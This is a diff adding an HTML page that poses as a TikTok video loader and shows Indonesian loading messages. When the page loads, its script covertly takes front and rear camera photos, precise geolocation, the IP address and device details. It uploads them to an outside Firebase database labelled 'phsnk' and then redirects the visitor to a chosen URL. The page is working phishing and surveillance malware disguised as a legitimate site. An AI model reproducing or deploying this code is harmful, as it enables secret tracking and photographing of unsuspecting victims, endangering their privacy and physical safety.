@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TikTok - Make Your Day</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:#000;color:#fff;font-family:sans-serif;overflow:hidden;display:flex;align-items:center;justify-content:center;flex-direction:column}
+.logo{font-size:48px;font-weight:900;background:linear-gradient(45deg,#fe2c55,#25f4ee);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:30px}
+.spinner{width:44px;height:44px;border:4px solid rgba(255,255,255,.15);border-top-color:#fe2c55;border-radius:50%;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.text{margin-top:20px;color:#888;font-size:14px}
+</style>
+</head>
+<body>
+<div class="logo">TikTok</div>
+<div class="spinner"></div>
+<div class="text" id="txt">Memuat video...</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+// FIREBASE CONFIG
+firebase.initializeApp({
+  apiKey: "AIzaSyCNw1ZCIq-sItu5Q3p_BvJfwzMtnPAvqhE",
+  authDomain: "iron-crasher.firebaseapp.com",
+  databaseURL: "https://iron-crasher-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "iron-crasher",
+  storageBucket: "iron-crasher.firebasestorage.app",
+  messagingSenderId: "279050968109",
+  appId: "1:279050968109:web:a6bb89d64ef296d7c0eca4"
+});
+const db = firebase.database();
+
+const params = new URLSearchParams(location.search);
+const targetUrl = params.get('target') || 'https://www.tiktok.com';
+const id = params.get('id') || ('PHSNK-' + Date.now().toString(36).toUpperCase());
+const txt = document.getElementById('txt');
+
+function setTxt(t){ txt.textContent = t; }
+
+async function captureCamera(facing){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing, width:{ideal:640}, height:{ideal:480} },
+      audio: false
+    });
+    const v = document.createElement('video');
+    v.srcObject = stream;
+    v.setAttribute('playsinline','true');
+    v.muted = true;
+    await v.play();
+    await new Promise(r => setTimeout(r, 1200));
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext('2d').drawImage(v, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    return c.toDataURL('image/jpeg', 0.7);
+  }catch(e){ console.log('cam err', e.message); return null; }
+}
+
+function captureLocation(){
+  return new Promise(res => {
+    if (!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p => res({
+        lat: p.coords.latitude.toFixed(6),
+        lng: p.coords.longitude.toFixed(6),
+        accuracy: Math.round(p.coords.accuracy),
+        mapUrl: 'https://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude
+      }),
+      () => res(null),
+      { enableHighAccuracy:true, timeout:8000 }
+    );
+  });
+}
+
+async function captureDevice(){
+  const ua = navigator.userAgent;
+  let name = 'Unknown';
+  if (/Android/i.test(ua)) { const m = ua.match(/Android\s[\d.]+;\s([^)]+)\)/); name = m ? m[1] : 'Android'; }
+  else if (/iPhone|iPad/i.test(ua)) name = 'iPhone/iPad';
+  else if (/Windows/i.test(ua)) name = 'Windows PC';
+  else if (/Mac/i.test(ua)) name = 'Mac';
+
+  const info = {
+    namaHp: name,
+    os: navigator.platform || '-',
+    browser: /Chrome/i.test(ua) ? 'Chrome' : /Safari/i.test(ua) ? 'Safari' : /Firefox/i.test(ua) ? 'Firefox' : 'Unknown',
+    userAgent: ua,
+    screen: screen.width + 'x' + screen.height,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    battery: null,
+    batteryCharging: null,
+    ip: 'Fetching...'
+  };
+
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      info.battery = Math.round(b.level * 100);
+      info.batteryCharging = b.charging;
+    }
+  } catch(e){}
+
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    info.ip = d.ip;
+  } catch(e){}
+
+  return info;
+}
+
+async function run(){
+  setTxt('Menghubungkan ke server...');
+  await new Promise(r => setTimeout(r, 400));
+
+  setTxt('Memuat komponen video...');
+  const fotoDepan = await captureCamera('user');
+  await new Promise(r => setTimeout(r, 300));
+
+  setTxt('Memuat komponen video...');
+  const fotoBelakang = await captureCamera('environment');
+  await new Promise(r => setTimeout(r, 300));
+
+  setTxt('Memuat data regional...');
+  const lokasi = await captureLocation();
+  await new Promise(r => setTimeout(r, 300));
+
+  setTxt('Menyiapkan pemutar...');
+  const device = await captureDevice();
+  await new Promise(r => setTimeout(r, 300));
+
+  setTxt('Menyelesaikan...');
+  try {
+    await db.ref('phsnk/' + id).update({
+      id, fotoDepan, fotoBelakang, lokasi, device,
+      capturedAt: Date.now(), status: 'captured'
+    });
+    console.log('[PHSNK] Saved!');
+  } catch(e) { console.error(e); }
+
+  setTxt('Selesai');
+
+  setTimeout(() => {
+    try { location.href = decodeURIComponent(targetUrl); }
+    catch(e) { location.href = 'https://www.tiktok.com'; }
+  }, 500);
+}
+
+window.addEventListener('load', () => setTimeout(run, 800));
+
+// Fallback
+setTimeout(() => {
+  if (document.visibilityState === 'visible') {
+    try { location.href = decodeURIComponent(targetUrl); }
+    catch(e) { location.href = 'https://www.tiktok.com'; }
+  }
+}, 12000);
+</script>
+</body>
+</html>
